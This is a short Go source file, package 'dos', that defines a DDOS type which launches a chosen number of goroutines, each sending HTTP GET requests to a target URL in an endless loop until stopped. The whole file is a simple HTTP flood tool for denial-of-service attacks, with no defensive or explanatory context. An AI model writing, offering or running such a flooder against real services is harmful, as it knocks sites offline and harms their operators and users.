package dos

import (
	"net/http"
)

type DDOS struct {
	Target  string
	Threads int
	cont    bool
}

func NewDDOS(target string, threads int) *DDOS {
	return &DDOS{Target: target, Threads: threads}
}

func (d *DDOS) Start() {
	d.cont = true
	threadNum := 0
	for threadNum < d.Threads {
		go d.do()
		threadNum += 1
	}
}

func (d *DDOS) do() {
	for d.cont {
		http.Get(d.Target)
	}
}

func (d *DDOS) Stop() {
	d.cont = false
}
